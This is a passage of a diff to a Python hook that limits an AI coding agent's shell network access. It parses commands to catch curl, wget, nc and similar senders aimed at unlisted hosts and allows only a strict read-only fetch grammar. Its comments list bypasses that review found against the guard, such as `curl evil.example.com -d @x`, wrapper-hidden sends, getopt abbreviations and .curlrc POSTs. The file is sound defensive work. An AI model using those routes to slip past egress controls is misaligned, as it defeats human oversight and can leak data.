@@ -48,7 +48,9 @@ import ipaddress
 import os
 import re
 import shlex
+import subprocess
 import sys
+import tempfile
 from urllib.parse import urlsplit
 
 # The shared "tell a command apart from the prose it carries" helper, already
@@ -56,7 +58,7 @@ from urllib.parse import urlsplit
 # for the reason its own docstring gives: two copies of "what counts as inert"
 # drift silently, because each copy still passes its own tests.
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from cmd_text import strip_inert_text  # noqa: E402
+from cmd_text import SHELL_BOUNDARIES, shell_operands, shell_tokens, strip_inert_text  # noqa: E402
 # Shared with hooks/record-home-gate.py, which refuses the FILE-TOOL spelling of
 # the same write. One memory, so a record refused through either door is
 # recognised at the other (rule 76a53dfe).
@@ -115,6 +117,8 @@ KNOWN_HOSTS = (
     # verifying a staging deploy toward the production URL instead. That is the
     # confusion the incident was made of, which is why it is listed here.
     "carr-mcp-staging.joe-bookout-carr-us.workers.dev",
+    # Staging app Worker, CARR-owned, no client data.
+    "doctorcre-app-staging.joe-bookout-carr-us.workers.dev",
     # nodejs.org: the official Node.js download host, and node is INFRASTRUCTURE
     # for this repo rather than a research read — mcp-server/local-verb.mjs is the
     # only route from a terminal or an unattended job to the record verbs, and
@@ -135,6 +139,10 @@ KNOWN_HOSTS = (
     # and the signed-out progress-board check read this exact host.
     "api.practicecre.com", "api.doctorcre.com", "app.doctorcre.com",
     "api.anthropic.com", "console.neon.tech",
+    # OpenRouter (Joe 2026-10-06): his own pay-per-token model router, used as a
+    # Claude Code ANTHROPIC_BASE_URL so builders can run GLM or DeepSeek models
+    # inside this harness, with these hooks still on, when subscriptions run dry.
+    "openrouter.ai",
     "neon.tech", "cloudflareapi.com", "cloudflare.com", "r2.cloudflarestorage.com",
     "googleapis.com", "github.com", "api.github.com", "hc-ping.com",
     # Dot relay uses the Slack Web API; its user token stays in ~/.hermes/.env.
@@ -157,6 +165,8 @@ KNOWN_HOSTS = (
     # strip the link, which quietly drops the attribution it exists to give.
     "arxiv.org", "anthropic.com", "claude.com", "humanlayer.dev", "mem0.ai",
     "langchain.com", "emergentmind.com",
+    # Official vendor announcements and developer/API documentation.
+    "openai.com", "developers.openai.com", "platform.openai.com",
     # TypeSafe, added 2026-09-17 on Joe's ruling. docs.typesafe.ai is the
     # documentation host and is a plain research read like the row above it;
     # api.typesafe.ai is the inference endpoint for Jev, a model that takes text
@@ -656,19 +666,48 @@ RULES = [
 # still broken. The loop names the right fix and this is it: decide from the
 # command's EXECUTABLE first, and only then look at hostnames.
 #
-# THE SENDER TEST. A sender name counts only in COMMAND POSITION — at the start of
-# the command, or after a pipe, semicolon, `&&`, `||`, a subshell opener, or one
-# of the usual prefix words (sudo/env/xargs/time/nohup) — optionally with a
-# leading path. That is what keeps `https` in `"see https://example.com"` from
-# matching while `curl`, `/usr/bin/curl` and `... | xargs curl` all still do.
-# `http`/`https` REMAIN senders in command position, because httpie's client is
-# literally named `http` and dropping it would open a real hole.
+# THE SENDER TEST. A sender name counts only as the EXECUTABLE a simple command
+# runs, optionally with a leading path. That is what keeps `https` in
+# `"see https://example.com"` from matching while `curl`, `/usr/bin/curl` and
+# `... | xargs curl` all still do. `http`/`https` REMAIN senders, because
+# httpie's client is literally named `http` and dropping it would open a real hole.
+#
+# WHAT "THE EXECUTABLE" MEANS is decided by normalising command position, not by
+# listing spellings (2026-10-08). The first version matched a sender only at the
+# start of a command or straight after a bare prefix word, so `X=1 curl -d ...`,
+# `env -i curl -d ...`, `env X=1 curl -d ...` and `timeout 5 curl -d ...` hid
+# the sender, and a data-sending curl to an unlisted host was ALLOWED; so were
+# the same sends inside `bash -c '...'`, `eval '...'` and after `then`/`do`.
+# Command position is now found the way the shell finds it (command_executables):
+#   - leading VAR=value assignments are skipped;
+#   - shell keywords that introduce a command (then, do, if, ! ...) are skipped;
+#   - a WRAPPER, a program that runs another command (env, sudo, timeout, nice,
+#     time, xargs ...), makes EVERY later word a candidate executable, because
+#     each wrapper takes its own options and option values and a parser that
+#     guessed them would be one unknown flag away from a hole; a later word
+#     holding spaces is a quoted command string and is read as a command;
+#   - the string a shell runs with -c, and the words eval runs, are commands too.
+# It reads the command twice: as properly quoted shell words, and as raw text
+# split at every boundary character, so a command substitution or backtick
+# inside a quoted string is still seen. Either reading finding a sender is
+# enough. Over-reading costs only the plain-fetch check below; under-reading
+# lets a send through.
 SENDER = (r"curl|wget|nc|ncat|netcat|telnet|ftp|sftp|scp|rsync|ssh|httpie|http|https"
           r"|links|lynx|w3m|aria2c|axel|fetch")
-SEND_CTX = re.compile(
-    r"(?:^|[|;&(){}`\n]|\$\(|&&|\|\||\bsudo\b|\bxargs\b|\benv\b|\btime\b|\bnohup\b|\bdoas\b)"
-    r"\s*(?:[\w./-]*/)?(?:" + SENDER + r")\b",
-    re.I)
+_SENDER_NAMES = frozenset(SENDER.lower().split("|"))
+# Programs whose job is to run another command given as their arguments.
+COMMAND_WRAPPERS = frozenset({
+    "xargs", "sudo", "doas", "env", "time", "nohup", "command", "exec", "builtin",
+    "watch", "timeout", "gtimeout", "parallel", "nice", "renice", "ionice", "stdbuf",
+    "setsid", "caffeinate", "unbuffer", "flock", "chronic", "chroot", "taskset", "chrt",
+    "script", "nsenter", "unshare", "firejail", "proxychains", "proxychains4", "torsocks",
+    "sandbox-exec", "arch", "su", "runuser", "pkexec", "coproc"})
+# Shell reserved words after which the next word is in command position.
+_COMMAND_KEYWORDS = frozenset({"then", "do", "else", "elif", "if", "while", "until",
+                               "!", "{"})
+_SHELLS = re.compile(r"^(?:ba|z|da|k|c|tc|fi|mk)?sh$")
+_ASSIGNMENT = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*(?:\[[^]]*\])?\+?=")
+_RAW_BOUNDARY = re.compile(r"[|;&(){}`\n]")
 
 # AN INTERPRETER THAT IMPORTS A NETWORK CLIENT IS ALSO A SENDER, and this half is
 # what keeps the narrower executable test from becoming a hole: `python3 -c "import
@@ -753,21 +792,329 @@ def is_sql_context(cmd):
     return bool(SQL_CONTEXT.search(cmd))
 
 
-def hosts_in(cmd):
-    """Every host this command could reach: URL hosts plus remote-copy targets."""
-    hosts = []
-    from cmd_text import shell_tokens
+_URL_IN_TOKEN = re.compile(r'https?://[^\s\'"<>]+', re.I)
+
+
+def urls_in(cmd):
+    """Every URL this command names: each http(s) URL in its shell words, plus
+    every destination a curl or wget in it is given WITHOUT a scheme (see
+    fetch_targets), written as `http://<target>` the way both tools read it."""
     try:
         tokens = shell_tokens(cmd)
     except ValueError:
         tokens = re.split(r'[\s;&|]', cmd)
-    for token in tokens:
-        for url in re.findall(r'https?://[^\s\'"<>]+', token, re.I):
-            try:
-                hosts.append(urlsplit(url).hostname or "invalid-url")
-            except ValueError:
-                hosts.append("invalid-url")
-    return hosts + REMOTE_TARGET_RE.findall(cmd)
+    urls = [url for token in tokens for url in _URL_IN_TOKEN.findall(token)]
+    for exe, args in invocations_in(cmd):
+        if exe in READ_ONLY_FETCHERS:
+            urls += [t for t in fetch_targets(exe, args) if t not in urls]
+    return urls
+
+
+def url_host(url):
+    """The URL's hostname, or "invalid-url" when it has none or does not parse."""
+    try:
+        return urlsplit(url).hostname or "invalid-url"
+    except ValueError:
+        return "invalid-url"
+
+
+def hosts_in(cmd):
+    """Every host this command could reach: URL hosts plus remote-copy targets."""
+    return [url_host(url) for url in urls_in(cmd)] + REMOTE_TARGET_RE.findall(cmd)
+
+
+# ── A DESTINATION WITHOUT A SCHEME (2026-10-08) ───────────────────────────────
+#
+# curl and wget read a bare `evil.example.com/path` as a URL. The host check
+# above used to see only `http(s)://` text, so `curl evil.example.com -d @x`
+# named no host, had nothing to fail, and the send went through. So every
+# operand of a curl or wget that can carry a destination is read as one: each
+# positional operand that parses as a host (a dotted name, an IP, a single
+# label, with optional user@, :port and path), the value of --url, and the
+# values of the options that ROUTE the request somewhere else (a proxy,
+# --connect-to, --resolve, --doh-url), because a body sent through an
+# unlisted proxy has reached that proxy. Option values are skipped by the same
+# arity tables the plain-fetch check uses, so `-o page.html` is a file name,
+# not a host; a numeric word (`--max-time 10` if an arity were ever missed) is
+# never read as a host.
+_HOSTLIKE = re.compile(
+    r"^(?:[^@/\s:]+(?::[^@/\s]*)?@)?"
+    r"(?:\[[0-9A-Fa-f:.]+\]|[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?"
+    r"(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)*\.?)"
+    r"(?::\d*)?(?:[/?#].*)?$")
+_ROUTE_LONG = frozenset({"url", "proxy", "preproxy", "proxy1.0", "socks4", "socks4a", "socks5",
+                         "socks5-hostname", "doh-url", "connect-to", "resolve"})
+_CURL_ARG_LONG = frozenset({
+    "abstract-unix-socket", "alt-svc", "aws-sigv4", "cacert", "capath", "cert", "cert-type",
+    "ciphers", "config", "connect-timeout", "connect-to", "continue-at", "cookie", "cookie-jar",
+    "create-file-mode", "crlfile", "curves", "data", "data-ascii", "data-binary", "data-raw",
+    "data-urlencode", "delegation", "dns-interface", "dns-ipv4-addr", "dns-ipv6-addr",
+    "dns-servers", "doh-url", "dump-header", "ech", "egd-file", "engine", "etag-compare",
+    "etag-save", "expect100-timeout", "form", "form-escape", "form-string", "ftp-account",
+    "ftp-alternative-to-user", "ftp-method", "ftp-port", "ftp-ssl-ccc-mode",
+    "happy-eyeballs-timeout-ms", "haproxy-clientip", "header", "hostpubmd5", "hostpubsha256",
+    "hsts", "interface", "ip-tos", "ipfs-gateway", "json", "keepalive-cnt", "keepalive-time",
+    "key", "key-type", "krb", "libcurl", "limit-rate", "local-port", "login-options",
+    "mail-auth", "mail-from", "mail-rcpt", "max-filesize", "max-redirs", "max-time",
+    "netrc-file", "noproxy", "oauth2-bearer", "output", "output-dir", "parallel-max", "pass",
+    "pinnedpubkey", "preproxy", "proto", "proto-default", "proto-redir", "proxy",
+    "proxy-cacert", "proxy-capath", "proxy-cert", "proxy-cert-type", "proxy-ciphers",
+    "proxy-crlfile", "proxy-header", "proxy-key", "proxy-key-type", "proxy-pass",
+    "proxy-pinnedpubkey", "proxy-service-name", "proxy-tls13-ciphers", "proxy-tlsauthtype",
+    "proxy-tlspassword", "proxy-tlsuser", "proxy-user", "proxy1.0", "pubkey", "quote",
+    "random-file", "range", "rate", "referer", "request", "request-target", "resolve",
+    "retry", "retry-delay", "retry-max-time", "sasl-authzid", "service-name", "sigalgs",
+    "socks4", "socks4a", "socks5", "socks5-gssapi-service", "socks5-hostname", "speed-limit",
+    "speed-time", "stderr", "telnet-option", "tftp-blksize", "time-cond", "tls-max",
+    "tls13-ciphers", "tlsauthtype", "tlspassword", "tlsuser", "trace", "trace-ascii",
+    "trace-config", "unix-socket", "upload-file", "upload-flags", "url", "url-query", "user",
+    "user-agent", "variable", "write-out"})
+_WGET_ARG_LONG = frozenset({
+    "accept", "accept-regex", "append-output", "ask-password", "backups", "base",
+    "bind-address", "bind-dns-address", "body-data", "body-file", "ca-certificate",
+    "ca-directory", "certificate", "certificate-type", "ciphers", "compression", "config",
+    "connect-timeout", "crl-file", "cut-dirs", "default-page", "directory-prefix",
+    "dns-servers", "dns-timeout", "domains", "exclude-directories", "exclude-domains",
+    "execute", "ftp-password", "ftp-user", "header", "hsts-file", "http-password",
+    "http-user", "include-directories", "input-file", "level", "limit-rate", "load-cookies",
+    "local-encoding", "max-redirect", "method", "output-document", "output-file", "password",
+    "pinnedpubkey", "post-data", "post-file", "prefer-family", "private-key",
+    "private-key-type", "progress", "proxy-password", "proxy-user", "quota", "random-file",
+    "read-timeout", "referer", "regex-type", "reject", "reject-regex", "rejected-log",
+    "remote-encoding", "report-speed", "restrict-file-names", "retry-on-http-error",
+    "save-cookies", "secure-protocol", "timeout", "tries", "use-askpass", "user",
+    "user-agent", "wait", "waitretry", "warc-cdx", "warc-dedup", "warc-file", "warc-header",
+    "warc-max-size", "warc-tempdir"})
+
+
+def _as_url(word):
+    return word if "://" in word else f"http://{word}"
+
+
+def _route_targets(name, value):
+    """Destinations carried by a routing option's value."""
+    if name in ("connect-to", "resolve"):
+        # HOST1:PORT1:HOST2:PORT2 / HOST:PORT:ADDR[,ADDR] — every name or address in it.
+        fields = re.split(r"[:,]", value.strip("[]"))
+        return [_as_url(f) for f in fields if f and not f.isdigit() and _HOSTLIKE.match(f)]
+    return [_as_url(value)] if value and _HOSTLIKE.match(value.split("://", 1)[-1]) else []
+
+
+def fetch_targets(tool, words):
+    """Every destination one curl/wget invocation is given without an http(s)
+    scheme, as `http://...` URLs (see A DESTINATION WITHOUT A SCHEME)."""
+    arg_long = _CURL_ARG_LONG if tool == "curl" else _WGET_ARG_LONG
+    arg_short = _CURL_ARG_SHORT if tool == "curl" else _WGET_ARG_SHORT
+    targets, i, operands_only = [], 0, False
+    while i < len(words):
+        w = words[i]
+        i += 1
+        if not operands_only and w == "--":
+            operands_only = True
+        elif not operands_only and w.startswith("--") and len(w) > 2:
+            name, eq, value = w[2:].partition("=")
+            name = name.lower()
+            if name in arg_long or name in _ROUTE_LONG:
+                if not eq and i < len(words):
+                    value = words[i]
+                    i += 1
+                if name in _ROUTE_LONG:
+                    targets += _route_targets(name, value)
+        elif not operands_only and w.startswith("-") and len(w) > 1:
+            cluster = w[1:]
+            for k, ch in enumerate(cluster):
+                if ch in arg_short:
+                    value = cluster[k + 1:]
+                    if not value and i < len(words):
+                        value = words[i]
+                        i += 1
+                    if tool == "curl" and ch == "x":
+                        targets += _route_targets("proxy", value)
+                    break
+        elif not re.match(r"https?://", w, re.I) and not w.isdigit() and _HOSTLIKE.match(w):
+            targets.append(_as_url(w))
+    return targets
+
+
+def _exe_name(word):
+    """A word read as an executable name: path and stray quoting removed, lowercased."""
+    return os.path.basename(word.strip("'\"\\")).lower()
+
+
+def _shell_c_script(words):
+    """The script a shell runs with -c (`bash -c`, `sh -ec`), or None."""
+    for k, w in enumerate(words[:-1]):
+        if w.startswith("-") and not w.startswith("--") and "c" in w:
+            return words[k + 1]
+    return None
+
+
+# Option grammar of the wrappers whose program position can be computed:
+# (short options taking a value, short flags, long options taking a value,
+#  long flags, operands before the program, pattern each operand must match).
+# A wrapper missing here, or any option missing from its entry, means the
+# program position is unknown, and the caller then reads every word as a
+# candidate. Under-modelling an option would hide the sender behind it, so an
+# unknown option fails closed rather than being guessed at.
+_DURATION = r"\d+(?:\.\d+)?[smhd]?"
+_WRAPPER_GRAMMAR = {
+    "timeout": ("sk", "v", {"--signal", "--kill-after"},
+                {"--preserve-status", "--foreground", "--verbose"}, 1, _DURATION),
+    "gtimeout": ("sk", "v", {"--signal", "--kill-after"},
+                 {"--preserve-status", "--foreground", "--verbose"}, 1, _DURATION),
+    "nohup": ("", "", set(), set(), 0, None),
+    "nice": ("n", "", {"--adjustment"}, set(), 0, None),
+    "env": ("uCSP", "i0v", {"--unset", "--chdir", "--split-string"},
+            {"--ignore-environment", "--null", "--debug"}, 0, None),
+    "sudo": ("ughprtUCDT", "AbBEeHiKklNnPSsVv",
+             {"--user", "--group", "--host", "--prompt", "--role", "--type",
+              "--other-user", "--close-from", "--chdir", "--command-timeout"},
+             {"--preserve-env", "--login", "--shell", "--non-interactive",
+              "--stdin", "--background", "--set-home", "--askpass", "--bell",
+              "--reset-timestamp", "--remove-timestamp"}, 0, None),
+    "flock": ("wEc", "sxnuoFh",
+              {"--timeout", "--wait", "--conflict-exit-code", "--command"},
+              {"--shared", "--exclusive", "--nonblock", "--nb", "--unlock",
+               "--close", "--no-fork", "--verbose"}, 1, None),
+    "chroot": ("", "", {"--userspec", "--groups"}, {"--skip-chdir"}, 1, None),
+    "xargs": ("aEIdLnPsJRS", "0oprtxie",
+              {"--arg-file", "--delimiter", "--eof", "--replace", "--max-lines",
+               "--max-args", "--max-procs", "--max-chars"},
+              {"--null", "--open-tty", "--interactive", "--no-run-if-empty",
+               "--verbose", "--exit", "--show-limits"}, 0, None),
+    "sandbox-exec": ("fnpD", "", set(), set(), 0, None),
+    "time": ("of", "pal", {"--output", "--format"},
+             {"--portability", "--append", "--verbose"}, 0, None),
+    "ionice": ("cnp", "t", {"--class", "--classdata", "--pid"},
+               {"--ignore"}, 0, None),
+}
+
+
+def _wrapped_program(exe, rest):
+    """Index in `rest` of the program wrapper `exe` runs, or None when the
+    position cannot be computed for certain (see _WRAPPER_GRAMMAR)."""
+    grammar = _WRAPPER_GRAMMAR.get(exe)
+    if grammar is None:
+        return None
+    short_value, short_flag, long_value, long_flag, operands, operand_re = grammar
+    i = 0
+    while i < len(rest):
+        w = rest[i]
+        if w == "--":
+            i += 1
+            break
+        if w.startswith("--"):
+            name = w.split("=", 1)[0]
+            if name not in long_value and name not in long_flag:
+                return None
+            i += 2 if (name in long_value and "=" not in w) else 1
+            continue
+        if w.startswith("-") and len(w) > 1:
+            if exe == "nice" and w[1:].isdigit():
+                i += 1
+                continue
+            takes_next = False
+            for j, c in enumerate(w[1:], 1):
+                if c in short_value:
+                    takes_next = j == len(w) - 1
+                    break
+                if c not in short_flag:
+                    return None
+            i += 2 if takes_next else 1
+            continue
+        if exe == "env" and _ASSIGNMENT.match(w):
+            i += 1
+            continue
+        break
+    for _ in range(operands):
+        if i >= len(rest) or (operand_re and not re.fullmatch(operand_re, rest[i])):
+            return None
+        i += 1
+    if i >= len(rest) or rest[i].startswith("-"):
+        return None
+    return i
+
+
+def command_invocations(words, depth=0):
+    """Every (executable, its argument words) one simple command could run,
+    after normalising command position (see THE SENDER TEST)."""
+    i = 0
+    while i < len(words) and (_ASSIGNMENT.match(words[i]) or words[i] in _COMMAND_KEYWORDS):
+        i += 1
+    if i >= len(words):
+        return []
+    exe, rest = _exe_name(words[i]), words[i + 1:]
+    found = [(exe, rest)]
+    if exe in COMMAND_WRAPPERS:
+        # A word with spaces is a quoted command string (`su -c '...'`,
+        # `sudo sh -c '...'`, `watch '...'`), so it is read as a command.
+        # Every other word is a candidate program, because a wrapper's option
+        # values and operands (`sudo -D /tmp`, `flock /tmp/lk`) can sit in front
+        # of the sender. The scan stops only where _wrapped_program places the
+        # program at a path or at another wrapper: the words after it are that
+        # program's arguments (`timeout 30 ./run.sh fetch <url>`). Past the
+        # recursion cap it does not stop at all, so deep nesting reads every word.
+        p = _wrapped_program(exe, rest)
+        stop = p if p is not None and ("/" in rest[p] or
+                                       _exe_name(rest[p]) in COMMAND_WRAPPERS) else None
+        for k, w in enumerate(rest):
+            if any(c.isspace() for c in w):
+                found += invocations_in(w, depth + 1) if depth < 4 else []
+            elif "://" in w:
+                continue
+            elif k == stop and depth < 4:
+                found += command_invocations(rest[k:], depth + 1)
+                break
+            else:
+                found.append((_exe_name(w), rest[k + 1:]))
+        return found
+    script = " ".join(rest) if exe == "eval" else (
+        _shell_c_script(rest) if _SHELLS.match(exe) else None)
+    if script and depth < 4:
+        found += invocations_in(script, depth + 1)
+    return found
+
+
+def command_executables(words, depth=0):
+    """The executable names of command_invocations."""
+    return [exe for exe, _ in command_invocations(words, depth)]
+
+
+def _command_words(segment):
+    """Shell words of one raw segment; unbalanced quoting falls back to splitting."""
+    try:
+        words = shlex.split(segment, posix=True)
+    except ValueError:
+        words = [w.strip("'\"") for w in segment.split()]
+    return _without_redirects(words)
+
+
+def _without_redirects(words):
+    words = [w for w in words if w not in ("(", ")", "{", "}")]
+    try:
+        return shell_operands(words)[0]
+    except ValueError:
+        return words
+
+
+def invocations_in(cmd, depth=0):
+    """Every (executable, argument words) `cmd` could run, from both the
+    quoted-word reading and the raw boundary-split reading (see THE SENDER TEST)."""
+    found = []
+    try:
+        tokens = shell_tokens(cmd)
+    except ValueError:
+        tokens = []
+    segment = []
+    for token in tokens + [";"]:
+        if token in SHELL_BOUNDARIES:
+            found += command_invocations(_without_redirects(segment), depth)
+            segment = []
+        else:
+            segment.append(token)
+    for raw in _RAW_BOUNDARY.split(cmd):
+        found += command_invocations(_command_words(raw), depth)
+    return found
 
 
 def is_send_context(cmd):
@@ -777,7 +1124,375 @@ def is_send_context(cmd):
     position, or an interpreter that references a network client library. A
     command that merely quotes a URL matches neither.
     """
-    return bool(SEND_CTX.search(cmd) or NET_CLIENT.search(cmd))
+    return bool(NET_CLIENT.search(cmd)
+                or _SENDER_NAMES.intersection(exe for exe, _ in invocations_in(cmd)))
+
+# ── THE PLAIN READ-ONLY FETCH (Joe, 2026-10-07) ──────────────────────────────
+#
+# Joe: research should "use the full internet". Until this ruling the Bash path
+# was allowlist-only for EVERY curl, because curl picks its own method and body
+# and so a host list was the only control. That is right for a command that can
+# SEND and wrong for one that can only READ: a GET or a download whose only
+# outbound bytes are a URL carries no more than WebFetch's open-read class does.
+#
+# So an unlisted host is allowed when the whole command is a plain read-only
+# fetch, decided from what the command SAYS — nothing here resolves DNS or runs
+# anything. Since the #1646 post-merge review (2026-10-11) the test is an
+# ALLOWLIST GRAMMAR, not a list of forbidden flags: the review admitted
+# `curl -n`, `wget --post-d=` (a GNU-getopt abbreviation), a .curlrc POST,
+# `| awk -f /dev/stdin`, `chmod +x` then execute, and `--output-dir hooks -O`,
+# each through a flag or stage the deny-list had never named. Now:
+#   - every network executable in command position is curl or wget, named as a
+#     bare word (not ./curl or a path) and called directly (not through
+#     xargs/sudo/env, which hide the URL or the method);
+#   - it runs CONFIGURATION-FREE: curl's first argument is -q (or --disable),
+#     wget carries --no-config and --no-netrc, so no ~/.curlrc, $CURL_HOME,
+#     wgetrc or ~/.netrc can add a body, header or credential the command text
+#     does not show; and the command carries no variable assignment at all
+#     (SSLKEYLOGFILE= writes anywhere, PATH=. picks a local curl);
+#   - every option is one of _FETCH_GRAMMAR's read-only options, spelled in
+#     FULL (an abbreviation, alias or unknown option is refused, so a getopt
+#     prefix can never reach a send option);
+#   - every operand, and --url, is an http(s) URL (a bare host reads as http);
+#   - every other stage is a known pure filter (_FETCH_FILTERS) — anything else,
+#     an interpreter, sed/awk, xargs, chmod, a ./path, is refused;
+#   - a curl that writes a file carries -g (--globoff), so URL globbing cannot
+#     rewrite the destination after it is judged;
+#   - NO DIRECTORY CHANGE AT ALL: a cd, pushd or popd anywhere in the command
+#     (a subshell, a brace group, builtin/command/eval forms) refuses it, and
+#   - a file is written ONLY by curl -o / wget -O naming a LITERAL ABSOLUTE
+#     path directly under FETCH_SCRATCH_ROOT (see _fetch_destination_refusal).
+#     Three review rounds of PR 1695 each found a new way to make a relative
+#     destination land somewhere other than where it was judged (curl URL
+#     globbing, a cd that failed or took an option, shell globs in the word,
+#     logical versus physical '..', CDPATH). Following shell semantics one
+#     trick at a time did not converge, so the guard no longer follows any:
+#     the destination word must already be the place the bytes land. curl -O,
+#     wget's default naming, a > redirect to anything but /dev/null and tee to
+#     a file are all refused; stdout into a filter stage stays allowed;
+#   - nothing the guard cannot read: no $-expansion, backtick or process
+#     substitution anywhere in the command, so the URL seen is the URL sent;
+#   - no interpreter network client and no scp/rsync remote target;
+#   - every unlisted URL passes webfetch_open_read_reason: the length and query
+#     caps, no secret or blob in the query, no credentials, a standard port, and
+#     a public DNS name (no IP, loopback, metadata or private suffix).
+# Anything else falls back to the allowlist, exactly as before.
+#
+# LIMITS, stated plainly. This judges the command text; it does not chase
+# obfuscation. A URL path can still carry up to the open-read cap of text, which
+# is the same residual channel WebFetch has had since 2026-08-09. DNS rebinding
+# is not caught, as for WebFetch. curl -L and wget follow redirects, so a public
+# host can bounce a GET to a loopback address; that GET still carries only the
+# URL out. The new-file and no-symlink checks run before the command, so a
+# path created or swapped between the check and the write is not seen — a race
+# only a concurrent writer can win.
+READ_ONLY_FETCHERS = frozenset({"curl", "wget"})
+_UNREADABLE = re.compile(r"[`]|\$[({A-Za-z_0-9@*#?$!-]|<\(|>\(")
+# curl/wget short options that consume the rest of the cluster (or the next word)
+# as their value. Used by fetch_targets to find destinations in ANY invocation,
+# send or not, so these list every value-taking letter, not only the allowed ones.
+_CURL_ARG_SHORT = frozenset("AbcCdDeEFHKmoQrtTuUwxXYyz")
+_WGET_ARG_SHORT = frozenset("aABDeiIlOoPQRtTUwX")
+_READ_METHODS = frozenset({"GET", "HEAD"})
+# The whole read-only grammar, per tool: (short flags, short options taking a
+# value, long flags, long options taking a value, whole words). A long option
+# must match one of these EXACTLY: both tools accept unique prefixes (`--post-d`)
+# and curl has aliases, so anything not spelled in full here is refused.
+# Value-taking entries whose value is a destination or method are checked in
+# _fetch_grammar_refusal; the rest take a number or a write-out format.
+_FETCH_GRAMMAR = {
+    "curl": (frozenset("sSfLIivO#46gN"), frozenset("omwX"),
+             frozenset({"silent", "show-error", "fail", "fail-with-body", "location", "head",
+                        "include", "verbose", "compressed", "remote-name", "progress-bar",
+                        "no-progress-meter", "ipv4", "ipv6", "http1.1", "http2", "globoff",
+                        "no-buffer"}),
+             frozenset({"output", "max-time", "connect-timeout", "retry", "retry-delay",
+                        "max-redirs", "max-filesize", "write-out", "request", "url"}),
+             frozenset()),
+    "wget": (frozenset("qS46"), frozenset("OTt"),
+             frozenset({"quiet", "no-verbose", "server-response", "spider", "no-clobber",
+                        "no-config", "no-netrc", "inet4-only", "inet6-only"}),
+             frozenset({"output-document", "timeout", "tries", "max-redirect", "read-timeout",
+                        "connect-timeout", "dns-timeout"}),
+             frozenset({"-nv", "-nc"})),
+}
+_NUMERIC_VALUE = re.compile(r"^\d+(?:\.\d+)?[kKmMgG]?$")
+# Downstream stages a fetch may feed: pure filters that neither write a file nor
+# run a program, each with the options that would break that (refused) or the
+# operand count that would. Anything not listed is refused.
+_FETCH_FILTERS = {
+    "head": None, "tail": None, "wc": None, "cut": None, "tr": None, "grep": None,
+    "egrep": None, "fgrep": None, "jq": None, "cat": None, "nl": None, "fold": None,
+    "column": None, "rev": None, "tac": None, "sha256sum": None, "shasum": None,
+    "md5sum": None, "echo": None, "printf": None, "true": None, "false": None,
+    # sort -o/--output writes, -T/--temporary-directory writes scratch files
+    # and --compress-program runs a program; uniq's second operand is an output file.
+    "sort": re.compile(r"^(?:-[^-]*[oT]|--[oct])"),
+    "uniq": "one-operand",
+}
+# The ONE directory a read-only fetch to an unlisted host may write into: the
+# system temp directory, spelled as its realpath (/tmp on Linux; on macOS the
+# /private/var/folders/.../T form, since /var is a symlink there).
+FETCH_SCRATCH_ROOT = os.path.realpath(tempfile.gettempdir())
+# Outputs that write no file: curl -o - / wget -O - (stdout) and /dev/null.
+_NO_FILE_OUTPUTS = frozenset({"-", "/dev/null"})
+# A destination word is plain characters only: no glob (* ? [ ] { }), no ~, $,
+# backquote, '#', quote, backslash, space or parenthesis — so the word the
+# shell hands curl/wget is exactly the word judged here.
+_LITERAL_PATH = re.compile(r"^/[A-Za-z0-9._,+=@%:/-]+$")
+# Directory changers, refused anywhere in a fetch command (no cd is followed).
+_DIRECTORY_CHANGERS = frozenset({"cd", "pushd", "popd", "chdir"})
+
+
+def _inside_git_tree(path):
+    """True when `path` (already real) is inside any git work tree."""
+    while True:
+        if os.path.lexists(os.path.join(path, ".git")):
+            return True
+        parent = os.path.dirname(path)
+        if parent == path:
+            return False
+        path = parent
+
+
+def _fetch_destination_refusal(path):
+    """None if untrusted downloaded bytes may be written to `path`, else why not.
+
+    The only file a fetch may write is a NEW, non-dot file named by a literal
+    absolute path under FETCH_SCRATCH_ROOT, with no glob, ~, $, backquote, '#'
+    or '..', no symlink anywhere on its parent path, outside every git work
+    tree. Nothing is resolved against a working directory, so no cd, glob or
+    '..' semantics can move the write away from the word judged."""
+    root = FETCH_SCRATCH_ROOT
+    rule = f"a fetch may write only a new file named by a literal absolute path under {root}"
+    if not _LITERAL_PATH.match(path or ""):
+        return (f"would write fetched bytes to {path or '(an unnamed file)'!r}: {rule} "
+                f"(no relative path, glob, ~, $, backquote or #)")
+    parts = path.split("/")[1:]
+    if any(p in ("", ".", "..") for p in parts):
+        return f"would write fetched bytes to {path!r}: {rule} (no '..', '.' or empty component)"
+    if parts[-1].startswith("."):
+        return f"would write fetched bytes to a dotfile ({path})"
+    parent = os.path.dirname(path)
+    if root in ("", "/") or not (parent == root or parent.startswith(root + "/")):
+        return f"would write fetched bytes outside the scratch root ({path}): {rule}"
+    if os.path.realpath(parent) != parent or not os.path.isdir(parent):
+        return f"would write fetched bytes through a symlink or missing directory ({path}): {rule}"
+    if os.path.lexists(path):
+        return f"would overwrite an existing path ({path})"
+    if _inside_git_tree(parent):
+        return f"would write fetched bytes inside a repository ({path})"
+    return None
+
+
+def _fetch_url_refusal(word):
+    """None if one fetch operand is an http(s) URL the open-read policy accepts
+    (or an allowlisted host), else why not."""
+    url = word if "://" in word else f"http://{word}"
+    if not re.match(r"https?://", url, re.I):
+        return f"{word.split('://')[0]}:// is not an http(s) read"
+    if host_allowlisted(url_host(url)):
+        return None
+    why = webfetch_open_read_reason(url)
+    return why.replace("WebFetch ", "the fetch ").split(" — blocked")[0] if why else None
+
+
+def _fetch_grammar_refusal(tool, words):
+    """None when one curl/wget invocation is configuration-free, uses only the
+    read-only grammar, names only acceptable URLs, and writes only to safe new
+    files; otherwise the reason it is not."""
+    if tool == "curl" and (not words or words[0] not in ("-q", "--disable")):
+        return "curl must start with -q so no .curlrc can add a body, header or credential"
+    if tool == "wget" and "--no-config" not in words:
+        return "wget needs --no-config so no wgetrc can add a body, header or credential"
+    if tool == "wget" and "--no-netrc" not in words:
+        return "wget needs --no-netrc so no ~/.netrc entry answers a server's login challenge"
+    short_flag, short_value, long_flag, long_value, whole = _FETCH_GRAMMAR[tool]
+    outputs, urls, remote_name, wget_named, spider, globoff = [], [], False, False, False, False
+    i, operands_only = (1 if tool == "curl" else 0), False
+    while i < len(words):
+        w = words[i]
+        i += 1
+        if operands_only or not w.startswith("-") or w == "-":
+            urls.append(w)
+            continue
+        if w == "--":
+            operands_only = True
+            continue
+        if w in whole:
+            continue
+        if w.startswith("--"):
